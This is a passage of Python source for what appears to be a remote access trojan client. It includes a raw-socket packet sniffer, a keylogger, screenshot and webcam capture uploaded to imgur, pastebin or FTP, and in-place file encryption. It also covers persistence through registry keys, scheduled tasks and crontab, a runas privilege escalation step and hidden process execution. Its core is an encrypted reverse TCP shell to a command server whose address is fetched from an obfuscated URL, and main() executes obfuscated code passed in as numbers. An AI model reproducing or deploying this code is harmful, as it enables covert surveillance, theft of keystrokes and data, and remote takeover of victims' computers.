            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Urg Pnt', urg_pnt))
            self.packetsniffer.capture.append('|================================================|')
            return recv_data
        except Exception as e:
            self.packetsniffer.capture.append("Error in {} header: '{}'".format('TCP', str(e)))


    @config(platforms=['linux2','darwin'])
    def _packetsniffer_ip_header(self, data):
        try:
            ip_hdr = struct.unpack('!6H4s4s', data[:20]) 
            ver = ip_hdr[0] >> 12
            ihl = (ip_hdr[0] >> 8) & 0x0f
            tos = ip_hdr[0] & 0x00ff 
            tot_len = ip_hdr[1]
            ip_id = ip_hdr[2]
            flags = ip_hdr[3] >> 13
            fragofs = ip_hdr[3] & 0x1fff
            ttl = ip_hdr[4] >> 8
            ipproto = ip_hdr[4] & 0x00ff
            chksum = ip_hdr[5]
            src = socket.inet_ntoa(ip_hdr[6])
            dest = socket.inet_ntoa(ip_hdr[7])
            data = data[20:]
            self.packetsniffer.capture.append('|================== IP HEADER ===================|')
            self.packetsniffer.capture.append('|================================================|')
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('VER', ver))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('IHL', ihl))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('TOS', tos))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Length', tot_len))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('ID', ip_id))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Flags', flags))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Frag Offset', fragofs))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('TTL', ttl))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Next Protocol', ipproto))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t |'.format('Source IP', src))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t |'.format('Dest IP', dest))
            self.packetsniffer.capture.append('|================================================|')
            return data, ipproto
        except Exception as e:
            self.packetsniffer.capture.append("Error in {} header: '{}'".format('IP', str(e)))


    @config(platforms=['linux2','darwin'])
    def _packetsniffer_eth_header(self, data):
        try:
            ip_bool = False
            eth_hdr = struct.unpack('!6s6sH', data[:14])
            dst_mac = binascii.hexlify(eth_hdr[0])
            src_mac = binascii.hexlify(eth_hdr[1])
            proto = eth_hdr[2] >> 8
            self.packetsniffer.capture.append('|================================================|')
            self.packetsniffer.capture.append('|================== ETH HEADER ==================|')
            self.packetsniffer.capture.append('|================================================|')
            self.packetsniffer.capture.append('|{:>20} | {}\t |'.format('Target MAC', '{}:{}:{}:{}:{}:{}'.format(dst_mac[0:2],dst_mac[2:4],dst_mac[4:6],dst_mac[6:8],dst_mac[8:10],dst_mac[10:12])))
            self.packetsniffer.capture.append('|{:>20} | {}\t |'.format('Source MAC', '{}:{}:{}:{}:{}:{}'.format(src_mac[0:2],src_mac[2:4],src_mac[4:6],src_mac[6:8],src_mac[8:10],src_mac[10:12])))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Protocol', proto))
            self.packetsniffer.capture.append('|================================================|')
            if proto == 8:
                ip_bool = True
            data = data[14:]
            return data, ip_bool
        except Exception as e:
            self.packetsniffer.capture.append("Error in {} header: '{}'".format('ETH', str(e)))



    # Public Methods
 


    @staticmethod
    @config(platforms=['win32','linux2','darwin'])
    def encrypt(data):
        """
        encrypt plaintext with 256-bit AES-CBC + HMAC-SHA256 authentication (fall back to classic XOR encryption when PyCrypto is not available)
        """
        return Client._encrypt_aes(data, Client.deobfuscate(Client._session['key'])) if 'AES' in Client.encrypt.mode else Client._encrypt_xor(data, Client.deobfuscate(Client._session['key']))


    @staticmethod
    @config(platforms=['win32','linux2','darwin'])
    def decrypt(data):
        """
        decrypt ciphertext with 256-bit AES-CBC + HMAC-SHA256 authentication (fall back to classic XOR encryption when PyCrypto is not available)
        """
        return Client._decrypt_aes(data, Client.deobfuscate(Client._session['key'])) if 'AES' in Client.encrypt.mode else Client._decrypt_xor(data, Client.deobfuscate(Client._session['key']))


    @staticmethod
    @config(platforms=['win32','linux2','darwin'], command=True, usage='encrypt_file <file>')
    def encrypt_file(filepath):
        """
        encrypt target file using currently configured encryption method
        """
        if os.path.isfile(filepath):
            try:
                with open(filepath, 'rb') as fp:
                    plaintext = fp.read()
                ciphertext = Client.encrypt(plaintext)
                if Client.debug:
                    target = os.path.join(os.path.dirname(filepath), 'encrypted_%s' % os.path.basename(filepath))
                    with open(target, 'wb') as fd:
                        fd.write(ciphertext)
                else:
                    with open(filepath, 'wb') as fd:
                        fd.write(ciphertext)
                return filepath
            except Exception as e:
                return str(e)
        else:
            return "File '{}' not found".format(filepath)
        

    @staticmethod
    @config(platforms=['win32','linux2','darwin'], command=True, usage='decrypt_file <file>')
    def decrypt_file(filepath):
        """
        decrypt target file using currently configured encryption method
        """
        if os.path.isfile(filepath):
            try:
                with open(filepath, 'rb') as fp:
                    ciphertext = fp.read()
                plaintext = Client.decrypt(ciphertext)
                with open(filepath, 'wb') as fd:
                    fd.write(plaintext)
                return filepath
            except Exception as e:
                return str(e)
        else:
            return "File '{}' not found".format(filepath)


    @config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> <file>\nmodes: imgur, pastebin, ftp')
    def upload(self, args):
        """
        upload file/data to imgur, pastebin, or ftp
        """
        try:
            mode, _, source = str(args).partition(' ')
            target  = 'upload_{}'.format(mode)
            if not source or not hasattr(self, target):
                return 'usage: upload <mode> <file>\nmode: ftp, pastebin, imgur\nfile: name of target file'
            try:
                return getattr(self, target)(source)
            except Exception as e:
                return 'Upload error: {}'.format(str(e))
        except Exception as e:
            return "{} returned error: '{}'".format(self.upload.func_name, str(e))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='scan <mode> <target>')
    def scan(self, arg):
        """
        port scanner - modes: host, ports, network
        """
        try:
            if len(arg.split()) == 1:
                host     = self._get_host()['private']
                if arg   == 'network':
                    mode = 'network'
                elif arg == 'host':
                    mode = 'host'
                elif arg == 'ports':
                    mode = 'ports'
                else:
                    return "usage: scan <mode> <ip>\nmode: network, host, ports"
            else:
                mode, _, host = arg.partition(' ')
                if mode not in ('host', 'ports', 'network'):
                    return "usage: scan <mode> <ip>\nmode: network, host, ports"
                if not self._is_ipv4_address(host):
                    return "Invalid target IP address"
            if mode == 'network':
                return self._scan_network(host)
            elif mode == 'host':
                if self._ping(host):
                    return "{} is online".format(host)
            elif mode == 'ports':
                if self._ping(host):
                    return self._scan_host(host)
                else:
                    return "{} is offline".format(host)
            else:
                return "usage: scan <mode> <ip>\nmode: network, host, ports"
        except Exception as e:
            return "{} returned error: '{}'".format(self.scan.func_name, str(e))        


    @config(platforms=['win32','linux2','darwin'], command=True, usage='webcam <mode> [options]\nmodes: image, video, stream\noptions: imgur (images), ftp (videos), port (streaming)')
    def webcam(self, args=None):
        """
        capture from webcam and upload to imgur, pastebin, ftp
        """
        if not args:
            return self._get_usage(self.webcam)
        try:
            port = None
            args = str(args).split()
            mode = args[0].lower() if len(args) else 'stream'
            if 'image' in mode:
                mode = 'image'
            elif 'video' in mode:
                mode = 'video'
            elif 'stream' in mode:
                mode = 'stream'
                if len(args) != 2:
                    return "Error - stream mode requires argument: 'port'"
                port = args[1]
            else:
                return self._get_usage(self.webcam)
            result   = getattr(self, '_webcam_{}'.format(mode))(port=port)
            return result
        except Exception as e:
            return "{} returned error: '{}'".format(self.webcam.func_name.strip('_').title(), str(e))


    @config(platforms=['linux2','darwin'], command=True, usage='packetsniffer <duration> [upload type]')
    def packetsniffer(self, duration, *args):
        """
        capture packets and upload to pastebin or ftp
        """
        def sniffer(self, seconds, *args):
            limit = time.time() + seconds
            sniffer_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            while time.time() < limit:
                try:
                    recv_data = sniffer_socket.recv(2048)
                    recv_data, ip_bool = self._packetsniffer_eth_header(recv_data)
                    if ip_bool:
                        recv_data, ip_proto = self._packetsniffer_ip_header(recv_data)
                        if ip_proto == 6:
                            recv_data = self._packetsniffer_tcp_header(recv_data)
                        elif ip_proto == 17:
                            recv_data = self._packetsniffer_udp_header(recv_data)
                except: break
            sniffer_socket.close()
            try:
                output = cStringIO.StringIO('\n'.join(self.packetsniffer.capture))
                result = self._upload_pastebin(output) if 'ftp' not in args else self._upload_ftp(output)
            except Exception as e:
                self._debug("packetsniffer manager returned error: {}".format(str(e)))
        try:
            if self.packetsniffer.func_name in self._jobs:
                return "packetsniffer running for {}".format(self._get_status(self._jobs[self.packetsniffer.func_name].name))
            if not str(duration).isdigit():
                return "packetsniffer argument 'duration' must be integer"
            duration = int(duration)
            self._jobs[self.packetsniffer.func_name] = threading.Thread(target=sniffer, args=(self, duration), name=time.time())
            self._jobs[self.packetsniffer.func_name].start()
            return 'Capturing network traffic for {} seconds'.format(duration)
        except Exception as e:
            return "{} returned error: '{}'".format(self.packetsniffer.func_name.title(), str(e))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='cd <path>')
    def cd(self, path='.'):
        """
        change directory
        """
        if os.path.isdir(path):
            os.chdir(path)
        else:
            os.chdir('.')


    @config(platforms=['win32','linux2','darwin'], command=True, usage='ls <path>')
    def ls(self, path='.'):
        """
        list directory contents
        """
        return '\n'.join(os.listdir(path)) if os.path.isdir(path) else 'Error: path not found'
    
        
    @config(platforms=['win32','linux2','darwin'], command=True, usage='ps [args]')
    def ps(self, args=None):
        """
        list, search, or kill processes
        """
        output = ''

        if not args:
            for i in self._get_process_list():
                output += '\n' + i
        else:
            cmd, _, arg = str(args).partition(' ')
        
            if 'aux' in cmd or 'exe' in cmd:
                for i in self._get_process_list(executables=True):
                    output += '\n' + i
            elif 'search' in cmd:
                process_list = self._get_process_list(executables=True)
                output       = next(process_list)
                for i in process_list:
                    if arg in i:
                        output += '\n' + i                        
            elif 'kill' in cmd or 'terminate' in cmd:
                try:
                    pr = psutil.Process(pid=int(arg))
                    pr.kill()
                    output = "Process {} killed".format(arg)
                except:
                    output = "Process {} does not exist or access was denied".format(arg)
        return output

    
    @config(platforms=['win32','linux2','darwin'], command=True, usage='pwd')
    def pwd(self):
        """
        show name of present working directory
        """
        return '\n' + os.getcwd()


    @config(platforms=['win32','linux2','darwin'], command=True, usage='cat <path>')
    def cat(self, path):
        """
        display file contents
        """
        output = ''
        if not os.path.isfile(path):
            return "Error: file not found"
        target = open(path, 'r')
        while True:
            try:
                line = target.readline().rstrip()
                if not line.isspace() and len(line) and len(output + '\n' + line) < 4096:
                    output += '\n' + line
                else: break
            except: break
        return output


    @config(platforms=['win32','linux2','darwin'], command=True, usage='set <args>')
    def set(self, arg):
        """
        set client options
        """
        try:
            target, _, opt = arg.partition(' ')
            option, _, val = opt.partition('=')
            if not hasattr(self, target) or target not in self._commands:
                return "command '{}' not found".format(target)
            if not hasattr(getattr(self, target), 'options'):
                return "command '{}' has no options".format(target)
            if option not in getattr(self, target).options:
                return "Option '{}' not found for target '{}'".format(option, target)
            if val.isdigit() and int(val) in (0,1):
                val = bool(int(val))
            elif val.isdigit():
                val = int(val)
            elif val.lower() in ('true', 'on', 'enable'):
                val = True
            elif val.lower() in ('false', 'off', 'disable'):
                val = False
            elif ',' in val:
                val = val.split(',')
            getattr(self, target).options[option] = val
        except Exception as e:
            return "{} returned error: '{}'".format(self.set.func_name.strip('_').title(), str(e))
        return self.options(target.lower())


    @config(platforms=['win32','linux2','darwin'], command=True, usage='wget <url>')
    def wget(self, url, filename=None):
        """
        download file from url
        """
        path, http = urllib.urlretrieve(url, filename) if url.startswith('http') else 'Invalid target URL - must begin with http:// or https://'
        return path


    @config(platforms=['win32','linux2','darwin'], command=True, usage='kill')
    def kill(self):
        """
        shutdown the current connection, reset session keys + flags, and stop all jobs
        """
        try:
            self._session.get('socket').close()
            _ = self._session.pop('socket', None)
            del _
        except: pass

        try:
            self._session['socket'] = None
            self._session['key']    = None
            self._session['id']     = None
        except Exception as e1:
            self._debug("{} returned error: {}".format(self.kill.func_name, str(e1)))

        try:
            self._session['connection'].clear()
        except Exception as e2:
            self._debug("{} returned error: {}".format(self.kill.func_name, str(e2)))

        for t in [i for i in self._jobs]:
            try:
                _ = self._jobs.pop(t, None)
                del _
            except: pass


    @config(platforms=['win32','linux2','darwin'], command=True, usage='jobs')
    def jobs(self):
        """
        show current active client jobs
        """
        try:
            return json.dumps({a: self._get_status(c=time.time()-float(self._jobs[a].name)) for a in self._jobs if self._jobs[a].is_alive()})
        except Exception as e:
            return "Command 'info' returned error: '{}'".format(str(e))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
    def stop(self, target):
        """
        stop a job in progress
        """
        try:
            if target in self._jobs:
                _ = self._jobs.pop(target, None)
                return "Job '{}' was stopped.".format(target)
            else:
                return "Job '{}' not found".format(target)
        except Exception as e:
            return "{} returned error: '{}'".format(self.stop.func_name.strip('_').title(), str(e))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='unzip <file>')
    def unzip(self, path):
        """
        unzip a compressed archive/file
        """
        if os.path.isfile(path):
            try:
                return zipfile.ZipFile(path).extractall('.')
            except Exception as e:
                return "{} returned error: '{}'".format(self.unzip.func_name.strip('_').title(), str(e))
        else:
            return "File '{}' not found".format(path)


    @config(platforms=['win32','linux2','darwin'], command=True, usage='standby')
    def standby(self):
        """
        disconnect from server but keep client alive
        """
        try:
            time.sleep(10)
            self.kill()
            return self.run()
        except Exception as e:
            return "{} returned error: '{}'".format(self.standby.func_name.strip('_').title(), str(e))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='admin')
    def admin(self):
        """
        check if current user has root privileges
        """
        try:   
            return "\tCurrent User:\t{}\n\tAdministrator:\t{}".format(self._info.get('username'),  bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()))
        except Exception as e:
            return "{} returned error: '{}'".format(self.admin.func_name.strip('_').title(), str(e))


    @config(platforms=['win32'], command=True, usage='escalate')
    def escalate(self):
        """
        attempt to escalate privileges
        """
        try:
            if self._info.get('administrator'):
                return "Current user '{}' has administrator privileges".format(self._info.get('username'))
            if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__, default=True))):
                if os.name is 'nt':
                    ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self._long_to_bytes(long(self.__f__, default=True))))
                    sys.exit()
                else:
                    return "Privilege escalation not yet available on '{}'".format(sys.platform)
        except Exception as e:
            return "{} returned error: '{}'".format(self.escalate.func_name.strip('_').title(), str(e))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='evaluate <code>')
    def evaluate(self, code):
        """
        eval() code directly and display results
        """
        try:
            return eval(code)
        except Exception as e:
            return "eval('{}') failed with error: {}".format(str(code), str(e))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='execute <app>')
    def execute(self, path):
        """
        execute a program in a hidden process (fall back to a standard subprocess if hidden process fails)
        """
        if os.path.isfile(path):
            name = os.path.splitext(os.path.basename(path))[0]
            try:
                self._jobs[name] = self.hidden_process(path)
                return "Job launched '{}' in a hidden process".format(name)
            except Exception as e:
                try:
                    self._jobs[name] = subprocess.Popen(path, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                    return "Job launched '{}' in a standard subprocess (visible on host machine)".format(name)
                except Exception as e:
                    return "{} returned error: {}".format(self.execute.func_name, str(e))
        else:
            return "File '{}' not found".format(str(path))


    @config(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger')
    def keylogger(self):
        """
        run keylogger in separate thread and upload logs to pastebin or ftp at regular interval
        """
        while True:
            try:
                hm = HookManager()
                hm.KeyDown = self._get_event
                hm.HookKeyboard()
                if os.name is 'nt':
                    PumpMessages()
                else:
                    time.sleep(0.1)
            except Exception as e:
                self._debug('{} error: {}'.format(self.keylogger.title(), str(e)))
                break


    @config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot [upload type]\nupload types: imgur, ftp')
    def screenshot(self, *args):
        """
        capture screenshot and upload to imgur or ftp
        """
        try:
            with mss.mss() as screen:
                img = screen.grab(screen.monitors[0])
            png     = self._get_png(img)
            result  = self._upload_imgur(png) if 'ftp' not in args else self._upload_ftp(png)
            return result
        except Exception as e:
            return "{} returned error: '{}'".format(self.screenshot.func_name.strip('_').title(), str(e))


    @config(platforms=['win32','linux2','darwin'], methods={method: {'established': bool(), 'result': bytes()} for method in ['hidden_file','scheduled_task','registry_key','startup_file','launch_agent','crontab_job']}, command=True, usage='persistence <add/remove> [method]')
    def persistence(self, args=None):
        """
        establish persistent access to the client host machine
        """
        if not args:
            for method in [_ for _ in self.persistence.methods if not self.persistence.methods[_]['established']]:
                target = '_persistence_add_{}'.format(cmd, method)
                if sys.platform in getattr(self, target).platforms:
                    established, result = getattr(self, target)()
                    self.persistence.methods[method]['established'] = established
                    self.persistence.methods[method]['result'] = result
                else:
                    self.persistence.methods[method]['established'] = False
                    self.persistence.methods[method]['result'] = "Persistence method '{}' is not compatible with {}".format(method, sys.platform)
            return json.dumps(self.persistence.methods, indent=2)
        else:
            cmd, _, method = str(args).partition(' ')
            method = method.replace(' ','_') if ' ' in method else method
            if not method:
                return "No persistence method selected\n{}".format(self._get_usage(self.persistence))
            elif cmd not in ('add','remove'):
                return "Invalid option '{}'\n{}".format(cmd, self._get_usage(self.persistence))
            elif method not in self.persistence.methods:
                return "Invalid persistence method '{}'\n{}".format(method, self._get_usage(self.persistence))
            elif self.persistence.methods[method].get('established'):
                return json.dumps(self.persistence.methods[method], indent=2)
            else:
                target = '_persistence_{}_{}'.format(cmd, method)
                if sys.platform in getattr(self, target).platforms:
                    established, result = getattr(self, target)()
                    self.persistence.methods[method]['established'] = established
                    self.persistence.methods[method]['result'] = result
                else:
                    self.persistence.methods[method]['established'] = False
                    self.persistence.methods[method]['result'] = "Persistence method '{}' is not compatible with {}".format(method, sys.platform)
                return json.dumps(self.persistence.methods[method], indent=2)
            
                
    @config(platforms=['win32','linux2','darwin'], command=True, usage='selfdestruct')
    def selfdestruct(self):
        """
        self-destruct and leave no trace on disk
        """
        try:
            self._exit = True
            self.kill()
            
            if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))).read():
                try:
                    os.remove(self.__f__)
                except: pass
                
                for method in [_ for _ in self.persistence.methods if self.persistence.methods[_]]:
                    try:
                        remove = getattr(self, '_persistence_remove_{}'.format(method))()
                    except Exception as e2:
                        self._debug("Error removing persistence method '{}': {}".format(method, str(e2)))
            
            try:
                os.remove(__file__)
            except: pass

        finally:
            shutdown = threading.Timer(1, self._shutdown)
            shutdown.start()
            sys.exit(0)


    @config(platforms=['win32'], command=True, usage='powershell <cmd>')
    def powershell(self, cmdline):
        """
        execute powershell commands in a hidden process
        """
        if os.name is 'nt':
            try:
                cmds = cmdline if type(cmdline) is list else str(cmdline).split()
                info = subprocess.STARTUPINFO()
                info.dwFlags = subprocess.STARTF_USESHOWWINDOW
                info.wShowWindow = subprocess.SW_HIDE
                command = ['powershell.exe', '/c', cmds]
                p = subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, universal_newlines=True)
                results, _ = p.communicate()
                return results
            except Exception as e:
                return 'Powershell error: {}'.format(str(e))
        else:
            return 'Powershell is only available on Windows platforms'
        

    @config(platforms=['win32','linux2','darwin'], command=True, usage='hidden <cmd>')
    def hidden_process(self, path, shell=True):
        """
        launch a program in a hidden process 
        """
        try:
            info = subprocess.STARTUPINFO()
            info.dwFlags = subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
            info.wShowWindow = subprocess.SW_HIDE
            p = subprocess.Popen(path, startupinfo=info, shell=shell)
            return p
        except Exception as e:
            self._debug("Hidden process error: {}".format(str(e)))
            

    @config(platforms=['win32','linux2','darwin'])
    def send_data(self, **kwargs):
        """
        encrypts message then appends the given 'end' character before sending to server
        """
        self._session['connection'].wait()
        try:
            self._session['socket'].sendall(self.encrypt(json.dumps(kwargs)) + '\n')
        except socket.error:
            self._session['connection'].clear()


    @config(platforms=['win32','linux2','darwin'])
    def recv_data(self, end="\n"):
        """
        listens and receives incoming data until the given 'end' character appears in data then decrypts it and returns the message
        """
        try:
            data = ""
            while end not in data:
                try:
                    data += self._session['socket'].recv(1024)
                except socket.error: break
            if data and len(data):
                data = self.decrypt(data.rstrip())
            return json.loads(data)
        except Exception as e:
            self._debug('{} error: {}'.format(self.recv_data.func_name.strip('_').title(), str(e)))

        
    @config(platforms=['win32','linux2','darwin'])
    def diffiehellman(self):
        """
        Diffie-Hellman transactionless key-agreement with 2048-bit modulus
        """
        try:
            g  = 2
            p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
            a  = bytes_to_long(os.urandom(32))
            xA = pow(g, a, p)
            self._session['socket'].send(long_to_bytes(xA))
            xB = bytes_to_long(self._session['socket'].recv(256))
            x  = pow(xB, a, p)
            y  = SHA256.new(long_to_bytes(x)).hexdigest()
            return self.obfuscate(y)
        except Exception as e:
            self._debug("Diffie-Hellman transactionless key-agreement failed with error: {}\nrestarting in 5 seconds...".format(str(e)))
            time.sleep(5)
            return self.run()

    def new_session(self, port=1337):
        """
        create connection with server and register a new encrypted session
        """
        def _addr(a, b, c):
            ab  = json.loads(self._post(a, headers={'API-Key': b}))
            ip  = ab[ab.keys()[0]][0].get('ip')
            if Client._is_ipv4_address(ip):
                return _sock(ip, c)
            else:
                Client._debug("Invalid IPv4 address ('{}')\nRetrying in 5...".format(ip))
                time.sleep(5)
                return _addr(a, b, c)
        def _sock(x, y):
            s  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(True)
            s.connect((x, y))
            return s

        self.kill()
        
        try:
            self._session['socket'] = _sock('localhost', int(port)) if self.debug else _addr(urllib.urlopen(self._long_to_bytes(long(self.__a__))).read(), self._long_to_bytes(long(self.__b__)), int(port))
            self._session['connection'].set()
            self._debug('\nConnected to {}:{}\n'.format(*self._session['socket'].getpeername()))

            self._session['key'] = self.diffiehellman()
            self._debug('Session Key: {}\n'.format(self._session['key']))

            self._session['socket'].sendall(self.encrypt(json.dumps(self._info)) + '\n')
            self._debug(json.dumps(self._info, indent=2) + '\n')

            buf = ''
            while '\n' not in buf:
                buf += self._session['socket'].recv(1024)
            self._session['id'] = self.decrypt(buf.rstrip())
            self._debug('Client ID: {}\n'.format(self._session['id']))
            return
        except Exception as e:
            self._debug("{} returned error: {}\nrestarting in 5 seconds...".format(self.new_session.func_name, str(e)))
            time.sleep(5)
        return self.run()


    def reverse_tcp_shell(self):
        """
        remotely access the host machine with a reverse tcp shell through an encrypted connections
        """
        while True:
            
            try:
                
                if self._session['connection'].wait(timeout=5.0):

                    prompt = {"id": "0" * 64, "client": self._session['id'], "command": "prompt", "data": "[{} @ %s]> " % os.getcwd()}
                    
                    self.send_data(**prompt)

                    self._debug("Sent prompt:\n{}".format(json.dumps(prompt, indent=2)))

                    task   = self.recv_data()

                    result = ''

                    if task:

                        command, _, action  = bytes(task['command']).partition(' ')

                        self._debug("\ntask: {}\nclient: {}\ncommand: {}\n".format(task['id'], task['client'], task['command']))
                        
                        if command in self._commands:

                            self._debug("Running client command '{}'...".format(self._commands[command]['method'].func_name))
                            
                            try:
                                result  = bytes(self._commands[command]['method'](action)) if len(action) else bytes(self._commands[command]['method']())
                            except Exception as e1:
                                result  = "Error: %s" % bytes(e1)
                        else:

                            self._debug("Running shell command '{}'...".format(self._commands[command].func_name))
                            
                            try:
                                result  = bytes().join(subprocess.Popen(task, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                            except Exception as e2:
                                result  = "Error: %s" % bytes(e2)

                    if result and result != "None":

                        task.update({"data": result})

                        self._debug("Sending task results:\n{}".format(json.dumps(task, indent=2)))
                    
                        self.send_data(**task)
                           
                    for name, worker in self._jobs.items():
                        if not worker.is_alive():
                            _ = self._jobs.pop(name, None)
                            del _

                    time.sleep(0.5)

                else:
                    self._debug("Client was disconnected - Restarting in 5 seconds...")
                    time.sleep(5)
                    break  
                
            except Exception as e3:
                self._debug("{} returned error: {}\nRestarting in 5 seconds...".format(self.reverse_tcp_shell.func_name, str(e3)))
                time.sleep(5)
                break
        return self.run()


    def run(self):
        """
        start new session and send a shell back to server upon connection
        """
        self.new_session()
        self._jobs[self.reverse_tcp_shell.func_name] = threading.Thread(target=self.reverse_tcp_shell, name=time.time())
        self._jobs[self.reverse_tcp_shell.func_name].start()




def main(*args, **kwargs):
    try:

        if 'f' not in kwargs and '__file__' in globals():
            kwargs['f'] = __file__

        if 'w' in kwargs:
            try:
                exec "import urllib" in globals()
                w = kwargs.get('w')
                w = Client._long_to_bytes(w)
                exec w in globals()
            except Exception as e:
                Client._debug("Dynamic package imports failed: {}".format(str(e)))

        if 'd' in kwargs:
            try:
                d = kwargs.get('d')
                imgur_api_key = Client._long_to_bytes(d)
                Client._configure('_upload_imgur', api_key=imgur_api_key)
            except Exception as e2:
                Client._debug("Dynamic Imgur configuration failed: {}".format(str(e2)))
                    
        if 'c' in kwargs:
            try:
                c = kwargs.get('c')
                pastebin_api_key = Client._long_to_bytes(c)
                Client._configure('_upload_pastebin', api_dev_key=pastebin_api_key)
            except Exception as e3:
                Client._debug("Dynamic Pastebin configuration failed: {}".format(str(e3)))
                    
        if 'e' in kwargs:
            try:
                e = kwargs.get('e')
                pastebin_user_key = Client._long_to_bytes(e)
                Client._configure('_upload_pastebin', api_user_key=pastebin_user_key)
            except Exception as e4:
                Client._debug("Dynamic Pastebin configuration failed: {}".format(str(e4)))

        if 'q' in kwargs:
            try:
                q = kwargs.get('q')
                q = Client._long_to_bytes(q).split()
                Client._configure('_upload_ftp', hostname=q[0], username=q[1], password=q[2])
            except Exception as e5:
                Client._debug("Dynamic FTP configuration failed: {}".format(str(e5)))

        if 'AES' in globals() and 'HMAC' in globals() and 'SHA256' in globals():
            Client._configure('encrypt', mode='AES', hash_algo='sha256')
        else:
            Client._configure('encrypt', mode='XOR', hash_algo='sha256')

    finally:
        payload = Client(**kwargs)
        payload.run()
        return payload


if __name__ == '__main__':
    m = main(**{
  "a": "81547499566857937463", 
  "c": "80194446127549985092", 
  "b": "79965932444658643559", 
  "d": "78307486292777321027", 
  "e": "81472904329291720535", 
  "g": "81336687865394389318",
  "j": "76650156158318301560",
  "l": "81040047328712224353", 
  "q": "79959173599698569031",
  "r": "81126388790932157784",
  "s": "81399447134546511973",
  "u": "76299683425183950643", 
  "t": "79310384705633414777", 
  "w": "77888090548015223857",
  "z": "79892739118577505130"
})

